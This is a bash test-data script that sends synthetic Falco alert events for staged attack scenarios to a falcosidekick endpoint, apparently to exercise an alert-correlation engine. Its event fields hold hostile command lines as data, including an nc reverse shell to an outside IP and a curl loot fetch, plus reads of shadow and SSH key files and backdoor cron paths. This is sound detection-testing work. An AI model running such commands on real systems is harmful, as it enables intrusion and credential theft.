#!/usr/bin/env bash
#
# Ingest realistic attack-scenario event sequences into a falcosidekick
# instance. Each scenario emits a small coherent burst the analyst narrative
# engine (ui/src/lib/analyst/) should correlate.
#
# Usage: hack/ingest-scenarios.sh [scenario ...] | --all | --help
#
# Scenarios:
#   credential-theft       Read /etc/shadow then outbound to C2
#   ssh-brute-force        Burst of SSH failed-auth events
#   recon-exec-privesc     File recon then shell then change-namespace
#   lateral-with-creds     Read id_rsa on host A, exec on host B
#   container-breakout     Priv container, namespace swap, write /etc
#   compromise-and-pivot   Mixed: privesc on host A, pivot exec on B/C/D
#
# Env: SIDEKICK_URL (default http://localhost:2801/)

set -euo pipefail

URL="${SIDEKICK_URL:-http://localhost:2801/}"
BASE="${URL%/}"

usage() { sed -n '2,/^set -euo/p' "$0" | sed '$d' | sed 's/^# \{0,1\}//;s/^#//'; }

if [[ $# -eq 0 || "${1:-}" == "-h" || "${1:-}" == "--help" ]]; then
  usage; exit 0
fi

command -v curl >/dev/null 2>&1 || { echo "curl not found" >&2; exit 1; }

if ! curl -sf --max-time 3 "${BASE}/healthz" >/dev/null 2>&1; then
  echo "[scenarios] falcosidekick not reachable at ${BASE}/healthz" >&2
  echo "[scenarios] start the backend or port-forward first" >&2
  exit 1
fi

iso_now() {
  local offset="${1:-0}"
  date -u -v-"${offset}"S +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null \
    || date -u -d "@$(( $(date +%s) - offset ))" +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null \
    || date -u +%Y-%m-%dT%H:%M:%S.000Z
}

# emit rule priority host source tags_csv fields_json [offset_seconds]
emit() {
  local rule="$1" priority="$2" host="$3" source="$4" tags_csv="$5" fields_json="$6" offset="${7:-0}"
  local ts tags_json first=1
  ts=$(iso_now "$offset")
  tags_json='['
  local IFS=','
  for t in $tags_csv; do
    if (( first == 0 )); then tags_json+=','; fi
    tags_json+="\"$t\""
    first=0
  done
  tags_json+=']'
  unset IFS
  local rule_esc="${rule//\"/\\\"}"
  local body
  body="{\"time\":\"$ts\",\"rule\":\"$rule_esc\",\"output\":\"$rule_esc on $host\",\"source\":\"$source\",\"priority\":\"$priority\",\"hostname\":\"$host\",\"tags\":$tags_json,\"output_fields\":$fields_json}"
  local code
  code=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 5 \
    -X POST -H 'Content-Type: application/json' -d "$body" "$URL" 2>/dev/null || echo "000")
  printf '  [%s] %s on %s\n' "$code" "$rule" "$host"
}

scenario_credential_theft() {
  echo "[scenarios] credential-theft (T1552 -> T1071) — richer sequence"
  local host="web-01" user="alice" proc="apache2" cont="abc123def456"
  # Early discovery — probing host state before cracking open a credential file
  emit "System information discovery" "notice" "$host" "syscall" \
    "filesystem,mitre_discovery" \
    "{\"fd.name\":\"/etc/hostname\",\"user.name\":\"$user\",\"proc.pname\":\"$proc\"}" 300
  sleep 0.3
  emit "Read sensitive file untrusted" "warning" "$host" "syscall" \
    "filesystem,mitre_discovery" \
    "{\"fd.name\":\"/etc/passwd\",\"user.name\":\"$user\",\"proc.pname\":\"$proc\",\"proc.name\":\"cat\",\"container.id\":\"$cont\"}" 270
  sleep 0.3
  emit "Read sensitive file untrusted" "warning" "$host" "syscall" \
    "filesystem,mitre_discovery" \
    "{\"fd.name\":\"/etc/hosts\",\"user.name\":\"$user\",\"proc.pname\":\"$proc\",\"proc.name\":\"cat\",\"container.id\":\"$cont\"}" 260
  sleep 0.3
  # Credential files proper
  emit "Read sensitive file untrusted" "warning" "$host" "syscall" \
    "filesystem,mitre_credential_access" \
    "{\"fd.name\":\"/etc/shadow\",\"user.name\":\"$user\",\"proc.pname\":\"$proc\",\"proc.name\":\"cat\",\"container.id\":\"$cont\"}" 200
  sleep 0.3
  emit "Read sensitive file untrusted" "warning" "$host" "syscall" \
    "filesystem,mitre_credential_access" \
    "{\"fd.name\":\"/root/.ssh/id_rsa\",\"user.name\":\"$user\",\"proc.pname\":\"$proc\",\"proc.name\":\"cat\",\"container.id\":\"$cont\"}" 180
  sleep 0.3
  emit "Read sensitive file untrusted" "warning" "$host" "syscall" \
    "filesystem,mitre_credential_access" \
    "{\"fd.name\":\"/home/$user/.ssh/id_rsa\",\"user.name\":\"$user\",\"proc.pname\":\"$proc\",\"proc.name\":\"cat\",\"container.id\":\"$cont\"}" 160
  sleep 0.3
  # Exfil prep — spawn a shell and staging tools
  emit "Terminal shell in container" "error" "$host" "syscall" \
    "shell,mitre_execution" \
    "{\"user.name\":\"$user\",\"proc.pname\":\"$proc\",\"proc.name\":\"bash\",\"container.id\":\"$cont\"}" 140
  sleep 0.3
  emit "Launch suspicious network tool" "error" "$host" "syscall" \
    "network,process,mitre_execution" \
    "{\"user.name\":\"$user\",\"proc.pname\":\"$proc\",\"proc.name\":\"nc\",\"proc.cmdline\":\"nc -e /bin/sh 185.220.101.42 443\",\"container.id\":\"$cont\"}" 120
  sleep 0.3
  # Outbound C2 — three beacons to the same peer
  emit "Unexpected outbound connection" "critical" "$host" "syscall" \
    "network,mitre_command_and_control" \
    "{\"fd.rip\":\"185.220.101.42\",\"fd.rport\":443,\"user.name\":\"$user\",\"proc.pname\":\"$proc\",\"proc.name\":\"curl\",\"container.id\":\"$cont\"}" 90
  sleep 0.3
  emit "Unexpected outbound connection" "critical" "$host" "syscall" \
    "network,mitre_command_and_control" \
    "{\"fd.rip\":\"185.220.101.42\",\"fd.rport\":8443,\"user.name\":\"$user\",\"proc.pname\":\"$proc\",\"proc.name\":\"curl\",\"container.id\":\"$cont\"}" 70
  sleep 0.3
  emit "Unexpected outbound connection" "critical" "$host" "syscall" \
    "network,mitre_command_and_control" \
    "{\"fd.rip\":\"185.220.101.42\",\"fd.rport\":443,\"user.name\":\"$user\",\"proc.pname\":\"$proc\",\"proc.name\":\"curl\",\"container.id\":\"$cont\"}" 50
}

scenario_ssh_brute_force() {
  echo "[scenarios] ssh-brute-force"
  local host="edge-gw-1"
  for i in $(seq 1 12); do
    emit "Disallowed SSH connection" "warning" "$host" "syscall" \
      "network,mitre_lateral_movement" \
      "{\"fd.rip\":\"203.0.113.9\",\"fd.rport\":22,\"user.name\":\"invalid-$i\",\"proc.pname\":\"sshd\"}" $((120 - i * 6))
    sleep 0.2
  done
}

scenario_recon_exec_privesc() {
  echo "[scenarios] recon -> exec -> privesc — richer sequence"
  local host="worker-3" user="bob" proc="bash" cont="rec0n00exec123"
  # Recon: inspect system layout and accounts
  emit "System information discovery" "notice" "$host" "syscall" \
    "filesystem,mitre_discovery" \
    "{\"fd.name\":\"/proc/version\",\"user.name\":\"$user\",\"proc.pname\":\"$proc\"}" 480
  sleep 0.2
  emit "Read sensitive file untrusted" "warning" "$host" "syscall" \
    "filesystem,mitre_discovery" \
    "{\"fd.name\":\"/etc/passwd\",\"user.name\":\"$user\",\"proc.pname\":\"$proc\"}" 420
  sleep 0.2
  emit "Read sensitive file untrusted" "warning" "$host" "syscall" \
    "filesystem,mitre_discovery" \
    "{\"fd.name\":\"/etc/group\",\"user.name\":\"$user\",\"proc.pname\":\"$proc\"}" 400
  sleep 0.2
  emit "Read sensitive file untrusted" "warning" "$host" "syscall" \
    "filesystem,mitre_discovery" \
    "{\"fd.name\":\"/proc/self/status\",\"user.name\":\"$user\",\"proc.pname\":\"$proc\"}" 380
  sleep 0.2
  # Execution: spawn shell, run tools
  emit "Terminal shell in container" "error" "$host" "syscall" \
    "shell,mitre_execution" \
    "{\"user.name\":\"$user\",\"proc.pname\":\"$proc\",\"proc.name\":\"bash\",\"container.id\":\"$cont\"}" 280
  sleep 0.2
  emit "Launch suspicious network tool" "error" "$host" "syscall" \
    "network,process,mitre_execution" \
    "{\"user.name\":\"$user\",\"proc.pname\":\"$proc\",\"proc.name\":\"nmap\",\"proc.cmdline\":\"nmap -sT 10.0.0.0/24\",\"container.id\":\"$cont\"}" 240
  sleep 0.2
  emit "Launch package management" "warning" "$host" "syscall" \
    "process,software_mgmt,mitre_execution" \
    "{\"user.name\":\"$user\",\"proc.pname\":\"$proc\",\"proc.name\":\"apt\",\"proc.cmdline\":\"apt install -y gcc\",\"container.id\":\"$cont\"}" 200
  sleep 0.2
  # Privilege escalation: sudo abuse then namespace escape
  emit "Sudo Potential Privilege Escalation" "error" "$host" "syscall" \
    "users,mitre_privilege_escalation" \
    "{\"user.name\":\"$user\",\"proc.pname\":\"$proc\",\"proc.name\":\"sudo\",\"proc.cmdline\":\"sudo -i\",\"container.id\":\"$cont\"}" 140
  sleep 0.2
  emit "Change thread namespace" "critical" "$host" "syscall" \
    "process,mitre_privilege_escalation" \
    "{\"user.name\":\"$user\",\"proc.pname\":\"$proc\",\"proc.name\":\"nsenter\",\"container.id\":\"$cont\"}" 100
  sleep 0.2
  # Persistence write — extends the chain into persist-after-privesc
  emit "Write below etc" "error" "$host" "syscall" \
    "filesystem,mitre_persistence" \
    "{\"user.name\":\"$user\",\"proc.pname\":\"$proc\",\"fd.name\":\"/etc/cron.d/backdoor\",\"container.id\":\"$cont\"}" 60
}

scenario_lateral_with_creds() {
  echo "[scenarios] lateral-with-creds — richer sequence"
  local user="carol"
  # Cred theft on host A
  emit "Read sensitive file untrusted" "warning" "web-01" "syscall" \
    "filesystem,mitre_credential_access" \
    "{\"fd.name\":\"/home/carol/.ssh/id_rsa\",\"user.name\":\"$user\",\"proc.pname\":\"bash\"}" 1500
  sleep 0.2
  emit "Read sensitive file untrusted" "warning" "web-01" "syscall" \
    "filesystem,mitre_credential_access" \
    "{\"fd.name\":\"/home/carol/.ssh/known_hosts\",\"user.name\":\"$user\",\"proc.pname\":\"bash\"}" 1440
  sleep 0.2
  emit "Read sensitive file untrusted" "warning" "web-01" "syscall" \
    "filesystem,mitre_credential_access" \
    "{\"fd.name\":\"/home/carol/.ssh/config\",\"user.name\":\"$user\",\"proc.pname\":\"bash\"}" 1380
  sleep 0.2
  emit "Read sensitive file untrusted" "warning" "web-01" "syscall" \
    "filesystem,mitre_credential_access" \
    "{\"fd.name\":\"/etc/kubernetes/admin.conf\",\"user.name\":\"$user\",\"proc.pname\":\"bash\"}" 1320
  sleep 0.2
  # Pivot to host B via SSH
  emit "Disallowed SSH connection" "warning" "web-01" "syscall" \
    "network,mitre_lateral_movement" \
    "{\"fd.rip\":\"10.0.5.10\",\"fd.rport\":22,\"user.name\":\"$user\",\"proc.pname\":\"ssh\"}" 1200
  sleep 0.2
  emit "Terminal shell in container" "error" "app-02" "syscall" \
    "shell,mitre_execution" \
    "{\"user.name\":\"$user\",\"proc.pname\":\"sshd\",\"proc.name\":\"bash\"}" 1140
  sleep 0.2
  emit "System information discovery" "notice" "app-02" "syscall" \
    "filesystem,mitre_discovery" \
    "{\"fd.name\":\"/etc/hostname\",\"user.name\":\"$user\",\"proc.pname\":\"bash\"}" 1080
  sleep 0.2
  emit "Launch suspicious network tool" "error" "app-02" "syscall" \
    "network,process,mitre_execution" \
    "{\"user.name\":\"$user\",\"proc.pname\":\"bash\",\"proc.name\":\"curl\",\"proc.cmdline\":\"curl http://10.0.5.11/loot\"}" 1000
  sleep 0.2
  # Privesc on host B + persistence
  emit "Sudo Potential Privilege Escalation" "error" "app-02" "syscall" \
    "users,mitre_privilege_escalation" \
    "{\"user.name\":\"$user\",\"proc.pname\":\"bash\",\"proc.name\":\"sudo\",\"proc.cmdline\":\"sudo su -\"}" 900
  sleep 0.2
  emit "Change thread namespace" "critical" "app-02" "syscall" \
    "process,mitre_privilege_escalation" \
    "{\"user.name\":\"$user\",\"proc.pname\":\"bash\",\"proc.name\":\"nsenter\"}" 840
  sleep 0.2
  emit "Write below etc" "error" "app-02" "syscall" \
    "filesystem,mitre_persistence" \
    "{\"user.name\":\"$user\",\"proc.pname\":\"bash\",\"fd.name\":\"/etc/cron.daily/bd\"}" 780
  sleep 0.2
  emit "Modify shell configuration" "warning" "app-02" "syscall" \
    "filesystem,mitre_persistence" \
    "{\"user.name\":\"$user\",\"proc.pname\":\"bash\",\"fd.name\":\"/root/.bashrc\"}" 720
}

scenario_container_breakout() {
  echo "[scenarios] container-breakout — richer sequence"
  local host="worker-1" cont="brk0ut1abc999"
  # Spawn privileged pod and probe mount points
  emit "Launch Privileged Container" "notice" "$host" "syscall" \
    "container,mitre_privilege_escalation" \
    "{\"container.id\":\"$cont\",\"container.name\":\"privileged-pod\",\"user.name\":\"root\"}" 480
  sleep 0.2
  emit "Read sensitive file untrusted" "warning" "$host" "syscall" \
    "filesystem,mitre_discovery" \
    "{\"container.id\":\"$cont\",\"fd.name\":\"/proc/self/mountinfo\",\"user.name\":\"root\",\"proc.pname\":\"bash\"}" 420
  sleep 0.2
  emit "Read sensitive file untrusted" "warning" "$host" "syscall" \
    "filesystem,mitre_discovery" \
    "{\"container.id\":\"$cont\",\"fd.name\":\"/proc/1/cgroup\",\"user.name\":\"root\",\"proc.pname\":\"bash\"}" 400
  sleep 0.2
  # Namespace escape toolchain
  emit "Change thread namespace" "critical" "$host" "syscall" \
    "process,mitre_privilege_escalation" \
    "{\"container.id\":\"$cont\",\"proc.pname\":\"nsenter\",\"proc.name\":\"nsenter\",\"user.name\":\"root\"}" 360
  sleep 0.2
  emit "Launch suspicious network tool" "error" "$host" "syscall" \
    "network,process,mitre_execution" \
    "{\"container.id\":\"$cont\",\"proc.pname\":\"bash\",\"proc.name\":\"nc\",\"user.name\":\"root\"}" 320
  sleep 0.2
  # Persistence writes on the host filesystem
  emit "Write below etc" "error" "$host" "syscall" \
    "filesystem,mitre_persistence" \
    "{\"container.id\":\"$cont\",\"fd.name\":\"/etc/cron.d/backdoor\",\"proc.pname\":\"bash\",\"user.name\":\"root\"}" 260
  sleep 0.2
  emit "Write below etc" "error" "$host" "syscall" \
    "filesystem,mitre_persistence" \
    "{\"container.id\":\"$cont\",\"fd.name\":\"/etc/systemd/system/bd.service\",\"proc.pname\":\"bash\",\"user.name\":\"root\"}" 220
  sleep 0.2
  emit "Mkdir binary dirs" "warning" "$host" "syscall" \
    "filesystem,mitre_persistence" \
    "{\"container.id\":\"$cont\",\"fd.name\":\"/usr/local/sbin/evil\",\"proc.pname\":\"bash\",\"user.name\":\"root\"}" 180
  sleep 0.2
  emit "Modify shell configuration" "warning" "$host" "syscall" \
    "filesystem,mitre_persistence" \
    "{\"container.id\":\"$cont\",\"fd.name\":\"/root/.bashrc\",\"proc.pname\":\"bash\",\"user.name\":\"root\"}" 140
  sleep 0.2
  # Defense evasion: clear logs
  emit "Clear Log Activities" "error" "$host" "syscall" \
    "logs,mitre_defense_evasion" \
    "{\"container.id\":\"$cont\",\"fd.name\":\"/var/log/auth.log\",\"proc.pname\":\"bash\",\"user.name\":\"root\"}" 80
}

scenario_compromise_and_pivot() {
  echo "[scenarios] compromise-and-pivot — mixed chain + star, richer"
  local user="henry"
  # Chain on host-A
  emit "System information discovery" "notice" "host-A" "syscall" \
    "filesystem,mitre_discovery" \
    "{\"fd.name\":\"/etc/hostname\",\"user.name\":\"$user\",\"proc.pname\":\"python3\"}" 1800
  sleep 0.2
  emit "Read sensitive file untrusted" "warning" "host-A" "syscall" \
    "filesystem,mitre_credential_access" \
    "{\"fd.name\":\"/etc/shadow\",\"user.name\":\"$user\",\"proc.pname\":\"python3\"}" 1680
  sleep 0.2
  emit "Read sensitive file untrusted" "warning" "host-A" "syscall" \
    "filesystem,mitre_credential_access" \
    "{\"fd.name\":\"/root/.ssh/id_rsa\",\"user.name\":\"$user\",\"proc.pname\":\"python3\"}" 1620
  sleep 0.2
  emit "Sudo Potential Privilege Escalation" "error" "host-A" "syscall" \
    "users,mitre_privilege_escalation" \
    "{\"user.name\":\"$user\",\"proc.pname\":\"python3\",\"proc.name\":\"sudo\",\"proc.cmdline\":\"sudo -i\"}" 1560
  sleep 0.2
  emit "Change thread namespace" "critical" "host-A" "syscall" \
    "process,mitre_privilege_escalation" \
    "{\"user.name\":\"$user\",\"proc.pname\":\"python3\",\"proc.name\":\"nsenter\"}" 1500
  sleep 0.2
  emit "Write below etc" "error" "host-A" "syscall" \
    "filesystem,mitre_persistence" \
    "{\"user.name\":\"$user\",\"proc.pname\":\"python3\",\"fd.name\":\"/etc/cron.d/evil\"}" 1440
  sleep 0.2
  # Star pivot: 3 lateral shells from host-A identity to B, C, D
  emit "Disallowed SSH connection" "warning" "host-A" "syscall" \
    "network,mitre_lateral_movement" \
    "{\"fd.rip\":\"10.0.0.22\",\"fd.rport\":22,\"user.name\":\"$user\",\"proc.pname\":\"python3\"}" 1200
  sleep 0.2
  emit "Terminal shell in container" "error" "host-B" "syscall" \
    "shell,mitre_execution" \
    "{\"user.name\":\"$user\",\"proc.pname\":\"sshd\",\"proc.name\":\"bash\"}" 1140
  sleep 0.2
  emit "Launch suspicious network tool" "error" "host-B" "syscall" \
    "network,process,mitre_execution" \
    "{\"user.name\":\"$user\",\"proc.pname\":\"bash\",\"proc.name\":\"nc\"}" 1080
  sleep 0.2
  emit "Disallowed SSH connection" "warning" "host-A" "syscall" \
    "network,mitre_lateral_movement" \
    "{\"fd.rip\":\"10.0.0.33\",\"fd.rport\":22,\"user.name\":\"$user\",\"proc.pname\":\"python3\"}" 900
  sleep 0.2
  emit "Terminal shell in container" "error" "host-C" "syscall" \
    "shell,mitre_execution" \
    "{\"user.name\":\"$user\",\"proc.pname\":\"sshd\",\"proc.name\":\"bash\"}" 840
  sleep 0.2
  emit "Write below etc" "error" "host-C" "syscall" \
    "filesystem,mitre_persistence" \
    "{\"user.name\":\"$user\",\"proc.pname\":\"bash\",\"fd.name\":\"/etc/cron.d/cx\"}" 780
  sleep 0.2
  emit "Terminal shell in container" "error" "host-D" "syscall" \
    "shell,mitre_execution" \
    "{\"user.name\":\"$user\",\"proc.pname\":\"sshd\",\"proc.name\":\"bash\"}" 500
  sleep 0.2
  emit "Clear Log Activities" "error" "host-A" "syscall" \
    "logs,mitre_defense_evasion" \
    "{\"user.name\":\"$user\",\"proc.pname\":\"python3\",\"fd.name\":\"/var/log/syslog\"}" 300
}

ALL=(credential-theft ssh-brute-force recon-exec-privesc lateral-with-creds container-breakout compromise-and-pivot)

run_one() {
  case "$1" in
    credential-theft)     scenario_credential_theft ;;
    ssh-brute-force)      scenario_ssh_brute_force ;;
    recon-exec-privesc)   scenario_recon_exec_privesc ;;
    lateral-with-creds)   scenario_lateral_with_creds ;;
    container-breakout)   scenario_container_breakout ;;
    compromise-and-pivot) scenario_compromise_and_pivot ;;
    *) echo "[scenarios] unknown scenario: $1" >&2; return 2 ;;
  esac
}

if [[ "${1:-}" == "--all" ]]; then
  for s in "${ALL[@]}"; do run_one "$s"; done
  exit 0
fi

for arg in "$@"; do run_one "$arg"; done
